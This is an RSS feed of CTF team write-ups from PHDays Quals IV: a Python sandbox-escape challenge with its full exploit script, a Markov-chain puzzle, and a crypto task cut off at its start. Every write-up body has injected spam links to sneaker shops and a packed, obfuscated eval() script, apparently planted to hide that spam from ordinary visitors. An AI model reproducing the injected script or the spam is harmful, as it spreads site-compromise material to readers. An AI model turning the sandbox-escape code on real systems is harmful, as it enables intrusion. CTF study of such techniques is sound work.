@@ -1,0 +1,464 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xml:base="https://ctfcrew.org"  xmlns:dc="http://purl.org/dc/elements/1.1/">
+<channel>
+ <title>BalalaikaCr3w - PHDays Quals IV</title>
+ <link>https://ctfcrew.org/event/10</link>
+ <description></description>
+ <language>en</language>
+<item>
+ <title>yet another pyjail</title>
+ <link>https://ctfcrew.org/writeup/14</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/misc&quot;&gt;misc&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/10&quot;&gt;PHDays Quals IV&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;This task is new implementation of python sandbox.&lt;/p&gt;&lt;pre class=&quot;brush: bash&quot;&gt;import re
+import sys
+import string
+from sys import stdout
+sys.stderr = stdout
+
+
+sanitize = re.compile(
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;r&#039;(?:__|import|globals|locals|exec|eval|join|format|replace|translate|try|except|with|content|frame|back)&#039;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;).sub
+
+trusted_builtins = &quot;&quot;&quot;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;True False type int
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;&quot;&quot;.split()
+
+
+alphabet = &#039; \n\r0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ(),.:;&amp;lt;=&amp;gt;[]_{}&#039;
+
+t1 = &#039;&#039;.join(chr(code) for code in xrange(256))
+t2 = []
+for i in t1:
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if i in alphabet:
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;t2.append(i)
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;else:
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;t2.append(&#039; &#039;)
+trans_table = string.maketrans(t1, &#039;&#039;.join(t2))
+
+EXPECTED = 13.37
+
+del alphabet, t1, t2, i, sys, string, re
+
+
+def clear_builtins():
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;orig = __builtins__.__dict__.copy()
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;__builtins__.__dict__.clear()
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;for i in trusted_builtins:
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;__builtins__.__dict__[i] = orig[i]
+
+
+part1_of_flag = &#039;******************&#039;
+part2_of_flag = &#039;******************&#039;
+egg = &#039;egg&#039;
+
+
+def main():
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if raw_input() != &#039;leetleetleetleet&#039;:
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;print (&#039;Welcome to pyjail!\n\n&#039;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   &#039;Try to get the flag!\n&#039;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   &#039;Use ctrl+D or --- to submit your code\n&#039;)
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;stdout.flush()
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;code = []
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;total_bytes = 0
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;while True:
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;try:
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;value = raw_input()
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;total_bytes += len(value)
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;assert total_bytes &amp;lt; 1337
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if value == &#039;---&#039;:
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;break
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;code.append(value)
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;except EOFError:
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;break
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;code = sanitize(&quot;/*ERR*/&quot;, &#039;\n&#039;.join(code).translate(trans_table))
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;clear_builtins()
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;def sandbox():
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;t=r=y = t=o = s=o=l=v=e = t=h=e = d=i=v=i=s=i=o=n = q=u=i=z = 0
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;def exec_in_context(ctx):
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;exec code in ctx
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;print &#039;Flag is&#039;,
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;try:
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;assert FLAG != part1_of_flag
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;print FLAG
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;except:
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;print &#039;********************&#039;
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;def we_must_be_sure_flag_part1_is_ready():
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;global FLAG
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;FLAG = part1_of_flag
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;def we_must_be_sure_flag_part2_is_ready():
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;global FLAG
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;FLAG += part2_of_flag
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;def divider(v1):
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;a = &quot;You are lucky!&quot;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;b = &quot;Try again!&quot;
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;def divider(v2):
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;i,t,s,  n,o,t,  s,o,  h,a,r,d
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if int(v1) / int(v2) == EXPECTED:
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;print a
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;we_must_be_sure_flag_part2_is_ready()
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;else:
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;print b
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;we_must_be_sure_flag_part1_is_ready()
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return divider
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;exec_in_context({&#039;div&#039;: divider})
+
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;sandbox()
+
+
+if __name__ == &#039;__main__&#039;:
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;main()
+&lt;/pre&gt;&lt;p&gt;This time deleted all built-ins except (True, False, type, int) and appended some filters: &lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•__&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•import&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•globals&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•locals&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•exec&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•eval&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•join&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•format&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•replace&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•translate&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•try&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•except&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•with&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•content&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•frame&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•back&quot;&lt;br&gt; Let&#039;s write the script that connects to server, and sends simple CAPTCHA:&lt;/p&gt;&lt;pre class=&quot;brush: python&quot;&gt;hSock = create_connection((host, port))
+hSock.send(&quot;leetleetleetleet\n&quot;)
+&lt;/pre&gt;&lt;p&gt;After this we can send some code, that will be executed in the sandbox, as context we can see function &quot;divider&quot; as &quot;div&quot;:&lt;/p&gt;&lt;p&gt;As we can see all attributes with &quot;__&quot; are restricted: so magic like &quot;div.__dict__&quot; will not pass! The only methods of function we can use are: &lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•func_code,&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•func_defaults,&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•func_doc,&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•func_globals,&lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;•func_closure. &lt;br&gt; &quot;func_globals&quot; looks like very helpful, but string &quot;globals&quot; is restricted, so we need another way&lt;/p&gt;&lt;p&gt;After reading some manuals, comes understanding, that &quot;func_closure&quot; could be very useful. It returns &quot;cell&quot; objects, that have information about all objects declared inside the function.&lt;br&gt; &quot;Cell&quot; object has method cell_contents, but string &quot;contents&quot; is restricted again!&lt;/p&gt;&lt;p&gt;After a lot of research was found magic method of getting content of cell without using restricted method&lt;/p&gt;&lt;pre class=&quot;brush: python&quot;&gt;def get_cell_value(cell):
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return type(lambda: 0)(
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(lambda x: lambda: x)(0).func_code, {}, None, None, (cell,)
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;)()
+&lt;/pre&gt;&lt;p&gt;So the 8th and 9th cells are functions, that make flag. We just need to call them&lt;/p&gt;&lt;p&gt;Full exploit file;&lt;/p&gt;&lt;pre class=&quot;brush: python&quot;&gt;from socket import create_connection
+
+host = &quot;195.133.87.177&quot;
+port = 1337
+hSock = create_connection((host, port))
+hSock.send(&quot;leetleetleetleet\n&quot;)
+print hSock.recv(1024)
+print hSock.recv(1024)
+t = &quot;&quot;&quot;
+global EXPECTED, a, b
+a = b = 5
+EXPECTED = 1
+print 0, EXPECTED
+def get_cell_value(cell):
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return type(lambda: 0)(
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(lambda x: lambda: x)(0).func_code, {}, None, None, (cell,)
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;)()
+
+get_cell_value(div.func_closure[8])()
+get_cell_value(div.func_closure[9])()
+
+---
+&quot;&quot;&quot;
+hSock.send(t)
+print hSock.recv(1024)
+print hSock.recv(1024)
+&lt;/pre&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.juzsports.com/&quot;&gt;Sports brands&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.iicf.org/bdfrshop/items/view/12168&quot;&gt;【国内5月2日発売予定】ナイキ ウィメンズ エアマックス ココ サンダル 全4色 - スニーカーウォーズ&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Sun, 02 Feb 2014 11:21:15 +0000</pubDate>
+ <dc:creator>briskly</dc:creator>
+ <guid isPermaLink="false">14 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/14#comments</comments>
+</item>
+<item>
+ <title>Markoff</title>
+ <link>https://ctfcrew.org/writeup/13</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/ppc&quot;&gt;ppc&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;a href=&quot;/categories/trivia&quot;&gt;trivia&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/10&quot;&gt;PHDays Quals IV&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;The name of this task connected to &quot;Markov chain&quot;&lt;/p&gt;
+&lt;p&gt;The main idea of that system is that the next state depends only on the current state, and there is a probability of transition.&lt;/p&gt;
+&lt;p&gt;First try shows, that one word phrases are shutting down the connection.&lt;/p&gt;
+&lt;p&gt;So we need to start with two word phrase. First hint is in the password:&quot;talk_with_markov_about_positive_things&quot;.&lt;/p&gt;
+&lt;pre class=&quot;brush: bash&quot;&gt;
+send &gt;&gt; positive spam
+recv &amp;lt;&amp;lt; positive spam
+send &gt;&gt; positive spam
+recv &amp;lt;&amp;lt; positive hack
+&lt;/pre&gt;
+&lt;p&gt;As you can see server sometimes changes last word, and this is the main idea&lt;/p&gt;
+&lt;p&gt;We just need to write a script that will send the same string “n” times and look how last word will be changed. After scipt should send new phrase with changed last word and appended &quot;spam&quot; word. Result of this script is a long chain of words:&lt;/p&gt;
+&lt;pre class=&quot;brush: bash&quot;&gt;positive hack days ha_ha_not_that_easy maybe_technopandas_can_help phd technopandas techno_pandas sorry_wrong_turn techno pandas talk_with_markov_about_hacker&lt;/pre&gt;
+&lt;p&gt;After some words, you can get a chain of words:&amp;nbsp; &quot;talk_with_markov_about_hacker&quot; is a hint, to start a new chain with word &quot;hacker&quot; and this is the answer chain:&lt;/p&gt;
+&lt;pre class=&quot;brush: bash&quot;&gt;hacker quas wex exort yep_those_three_weird_words_are_the_flag&lt;/pre&gt;
+&lt;p&gt;To take egg, you need to start chain with word &quot;easter&quot;:&lt;/p&gt;
+&lt;pre class=&quot;brush: bash&quot;&gt;easter easter_egg dc245aad88104604acb82e566fde8ef6&lt;/pre&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.sneakersbe.com/&quot;&gt;Buy Sneakers&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.ietp.com/fr/dfecjzshop/collections/whatsnew&quot;&gt;Sneakers Nike Shoes&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Sun, 02 Feb 2014 08:30:27 +0000</pubDate>
+ <dc:creator>briskly</dc:creator>
+ <guid isPermaLink="false">13 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/13#comments</comments>
+</item>
+<item>
+ <title>Secc</title>
+ <link>https://ctfcrew.org/writeup/8</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/crypto&quot;&gt;crypto&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/10&quot;&gt;PHDays Quals IV&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;div&gt;&lt;strong&gt;Задание:&lt;/strong&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;This key verification scheme is built on elliptic crypto, bet this points are&lt;/div&gt;&lt;div&gt;impossible.&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;nc 195.133.87.171 5555&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;password: secch4l*&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Так же нам даны исходники этой схемы&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;background-color: #dff0d8; color: 